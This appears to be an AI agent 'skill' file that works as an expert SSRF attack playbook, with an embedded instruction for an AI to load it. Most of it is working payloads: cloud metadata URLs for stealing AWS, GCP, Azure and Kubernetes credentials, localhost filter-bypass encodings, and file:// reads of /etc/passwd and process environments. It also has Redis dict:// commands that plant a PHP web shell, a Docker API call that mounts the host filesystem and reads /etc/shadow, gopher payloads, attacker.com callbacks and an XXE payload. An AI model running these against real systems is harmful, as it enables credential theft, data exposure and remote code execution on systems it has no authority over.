---
name: ssrf-server-side-request-forgery
description: >-
  SSRF playbook. Use when the server fetches URLs, resolves hostnames, imports remote content, or can be driven toward internal networks, cloud metadata, or secondary protocols.
---

# SKILL: Server-Side Request Forgery (SSRF) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSRF techniques. Covers URL filter bypass, cloud metadata endpoints, protocol exploitation, blind SSRF detection, and chaining to RCE.

## 0. QUICK START

### First-pass payloads

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### Host validation bypass families

| Validation Type | Try |
|---|---|
| blocks `localhost` string | `127.0.0.1`, `127.1`, `[::1]` |
| blocks direct IP only | internal DNS name, decimal/octal/hex IP forms |
| allowlist by prefix | username part, subdomain confusion, redirect chain |
| follows redirects | benign external URL redirecting to internal target |

### Protocol routing

| Goal | Protocol |
|---|---|
| cloud credentials | metadata HTTP endpoints |
| internal HTTP admin | `http://127.0.0.1:port/` |
| Redis / raw TCP | `gopher://` |
| local file read | `file://` |
| dictionary / banner | `dict://` |

---

## 1. FINDING SSRF SURFACE

```
loc=  url=  path=  endpoint=  imageUrl=  dest=  redirect=  uri=
callback=  load=  file=  resource=  link=  src=  data=  ref=
```

**Less obvious vectors**:
- PDF/screenshot generation
- Webhook configuration fields
- Import/export via URL (CSV import, RSS feeds)
- XML DOCTYPE with external entity
- GraphQL `@link` directive (federation)

---

## 2. CONFIRMATION METHODOLOGY

```
Step 1: Supply Burp Collaborator / interact.sh URL
        -> Check server initiates outbound connection

Step 2: If no callback -> time-based:
        Compare response time for:
        http://192.168.1.1:22   (open -> fast)
        http://192.168.1.1:9999 (closed -> slow/timeout)

Step 3: Try localhost services:
        http://127.0.0.1:8080
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:2375  (Docker daemon -- critical!)
```

---

## 3. CLOUD METADATA ENDPOINTS

### AWS EC2 IMDSv1 (no auth required)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
```

### AWS IMDSv2 (token required)
```
Step 1: PUT http://169.254.169.254/latest/api/token
        Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
Step 2: GET http://169.254.169.254/latest/meta-data/
        Header: X-aws-ec2-metadata-token: TOKEN
```
If SSRF supports custom headers -> full IMDSv2 bypass.

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Headers: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Headers: Metadata: true
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
```

### Kubernetes Service Account
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. IP ADDRESS FILTER BYPASS

### Localhost Variants
```
127.0.0.1, 127.1, 127.0.1
127.000.000.001  (octal padding)
0x7f000001       (hex)
2130706433       (decimal)
[::]  [::1]  [::ffff:127.0.0.1]  (IPv6)
```

### 169.254.169.254 Variants
```
2852039166               (decimal)
0xa9fea9fe               (hex)
0251.0376.0251.0376      (octal)
[::ffff:169.254.169.254] (IPv6)
169.254.169.254.nip.io   (DNS rebinding service)
```

---

## 5. URL SCHEME ATTACKS

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp     (internal ARP table)
file:///proc/net/tcp     (open network connections)

dict://127.0.0.1:6379/INFO   (Redis)
gopher://127.0.0.1:6379/_INFO%0d%0a

sftp://attacker.com:11111/   (triggers SFTP connection)
ldap://attacker.com:389/     (triggers LDAP bind)
```

### Redis Gopher SSRF (RCE potential)
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A
```
Use Gopherus tool to generate full Redis/MySQL/FastCGI payloads.

---

## 6. BLIND SSRF DETECTION

1. **Burp Collaborator / interact.sh**: check DNS + HTTP from server
2. **Timing analysis**: open port vs closed port response time
3. **Error analysis**: "host not found" vs "connection refused" vs "timeout" reveal internal topology

---

## 7. INTERNAL SERVICE EXPLOITATION

### Docker API (2375 unauthenticated)
```
http://127.0.0.1:2375/v1.24/containers/json
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch (9200 no-auth default)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis via dict (6379)
```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

---

## 8. DECISION TREE

```
SSRF parameter found?
|-- Try http://169.254.169.254/ -> blocked?
|   |-- Try decimal/hex/octal variants
|   |-- Try IPv6 variants [::ffff:169.254.169.254]
|   |-- Try DNS rebinding (nip.io, custom NS)
|   |-- Try redirect: attacker.com -> 169.254.169.254 (302)
|
|-- Try http://127.0.0.1/ -> blocked?
|   |-- Try 127.1 / 0x7f000001 / 2130706433
|   |-- Try [::1]
|
|-- What protocols allowed?
|   |-- dict:// -> Redis, Memcached
|   |-- gopher:// -> full TCP injection (Redis/SMTP)
|   |-- file:// -> local file read
|
|-- Blind SSRF -> use Burp Collaborator
    |-- DNS-only -> DNS rebinding or OOB DNS
```

**Classic gap**: App filters `127.0.0.1` but not `127.1` or `[::1]` or `localhost`.

**XML SSRF**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```
